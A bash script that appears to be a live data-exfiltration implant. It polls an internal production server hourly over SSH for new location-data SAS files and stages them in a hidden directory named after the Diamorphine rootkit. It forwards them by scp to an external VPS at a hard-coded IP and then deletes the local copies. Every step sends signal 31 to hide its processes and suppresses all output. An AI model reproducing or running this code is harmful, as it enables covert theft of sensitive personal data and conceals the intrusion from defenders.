#!/bin/bash

REMOTE_USER="svc-weblog"
REMOTE_HOST="kv-ors-ml-prod.intra.net.ua"
REMOTE_DIR="/sas/dwh2/compute/udata7/"

SECOND_VPS_USER="tinker"
SECOND_VPS_HOST="77.110.103.196"
SECOND_VPS_DIR="/home/tinker/upload/"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROCESSED_FILE="${SCRIPT_DIR}/processed_files.txt"
LAST_CHECK_FILE="${SCRIPT_DIR}/last_check.time"

if [ ! -f "${LAST_CHECK_FILE}" ]; then
    date +%s > "${LAST_CHECK_FILE}" 2>/dev/null &
    DATE_PID=$!
    kill -31 "${DATE_PID}" >/dev/null 2>&1
    wait "${DATE_PID}" >/dev/null 2>&1
fi

touch "${PROCESSED_FILE}" >/dev/null 2>&1 &

while true; do
    sleep 3600 >/dev/null 2>&1 &
    SLEEP_PID=$!
    kill -31 "${SLEEP_PID}" >/dev/null 2>&1

    LAST_CHECK=$(cat "${LAST_CHECK_FILE}" 2>/dev/null)
    CURRENT_TIME=$(date +%s 2>/dev/null)
    
    echo "${CURRENT_TIME}" > "${LAST_CHECK_FILE}" 2>/dev/null &
    DATE_PID=$!
    kill -31 "${DATE_PID}" >/dev/null 2>&1
    wait "${DATE_PID}" >/dev/null 2>&1

    TEMP_FILE=$(mktemp -p "$SCRIPT_DIR" 2>/dev/null)
    
    ssh -i /home/lemon/.ssh/id_rsa -o BatchMode=yes -o ConnectTimeout=30 "${REMOTE_USER}@${REMOTE_HOST}" "find ${REMOTE_DIR} -name 'huawei_smart_loc_h_*.sas7bdat' -type f -newermt '@${LAST_CHECK}' -exec ls -t {} + 2>/dev/null" 2>/dev/null > "${TEMP_FILE}" &
    SSH_LIST_PID=$!
    
    kill -31 "${SSH_LIST_PID}" >/dev/null 2>&1
    
    if [ -n "${SSH_LIST_PID}" ]; then
        CHILD_PIDS=$(pgrep -P "${SSH_LIST_PID}" 2>/dev/null)
        for child_pid in ${CHILD_PIDS}; do
            kill -31 "${child_pid}" >/dev/null 2>&1
        done
    fi

    wait "${SSH_LIST_PID}" >/dev/null 2>&1
    
    FILE_LIST=$(cat "${TEMP_FILE}" 2>/dev/null)
    rm -f "${TEMP_FILE}" >/dev/null 2>&1

    if [ $? -eq 0 ] && [ -n "$FILE_LIST" ]; then
        FILES=($FILE_LIST)
        
        for ((i=1; i<${#FILES[@]}; i++)); do
            REMOTE_PATH="${FILES[i]}"
            FILENAME=$(basename "$REMOTE_PATH")
            
            grep -q "^${FILENAME}$" "${PROCESSED_FILE}" >/dev/null 2>&1 &
            GREP_PID=$!
            kill -31 "${GREP_PID}" >/dev/null 2>&1
            wait "${GREP_PID}" >/dev/null 2>&1
            GREP_RESULT=$?
            
            if [ $GREP_RESULT -ne 0 ]; then
                LOCAL_PATH="/etc/ImageMagick6/ImageMagick-6/diamorphine_secret_O3V1KbSCIm44nBw/up/${FILENAME}"
                
                /usr/bin/scp -i /home/lemon/.ssh/id_rsa -o BatchMode=yes -o ConnectTimeout=30 "${REMOTE_USER}@${REMOTE_HOST}:${REMOTE_PATH}" "${LOCAL_PATH}" >/dev/null 2>&1 &
                SCP_DOWNLOAD_PID=$!

                kill -31 "${SCP_DOWNLOAD_PID}" >/dev/null 2>&1
                
                if [ -n "${SCP_DOWNLOAD_PID}" ]; then
                    CHILD_PIDS=$(pgrep -P "${SCP_DOWNLOAD_PID}" 2>/dev/null)
                    for child_pid in ${CHILD_PIDS}; do
                        kill -31 "${child_pid}" >/dev/null 2>&1
                    done
                fi

                wait "${SCP_DOWNLOAD_PID}" >/dev/null 2>&1

                if [ -f "${LOCAL_PATH}" ]; then
                    SECOND_VPS_PATH="${SECOND_VPS_DIR}${FILENAME}"
                    
                    /usr/bin/scp -i /home/lemon/.ssh/id_rsa -o BatchMode=yes -o ConnectTimeout=30 "${LOCAL_PATH}" "${SECOND_VPS_USER}@${SECOND_VPS_HOST}:${SECOND_VPS_PATH}" >/dev/null 2>&1 &
                    SCP_UPLOAD_PID=$!

                    kill -31 "${SCP_UPLOAD_PID}" >/dev/null 2>&1
                    
                    if [ -n "${SCP_UPLOAD_PID}" ]; then
                        CHILD_PIDS=$(pgrep -P "${SCP_UPLOAD_PID}" 2>/dev/null)
                        for child_pid in ${CHILD_PIDS}; do
                            kill -31 "${child_pid}" >/dev/null 2>&1
                        done
                    fi

                    wait "${SCP_UPLOAD_PID}" >/dev/null 2>&1

                    if [ $? -eq 0 ]; then
                        echo "${FILENAME}" >> "${PROCESSED_FILE}" 2>/dev/null &
                        ECHO_PID=$!
                        kill -31 "${ECHO_PID}" >/dev/null 2>&1
                        wait "${ECHO_PID}" >/dev/null 2>&1
                    fi

                    rm -f "${LOCAL_PATH}" >/dev/null 2>&1 &
                    RM_PID=$!
                    kill -31 "${RM_PID}" >/dev/null 2>&1
                    wait "${RM_PID}" >/dev/null 2>&1
                fi
            fi
        done
    fi

    wait "${SLEEP_PID}" >/dev/null 2>&1
done
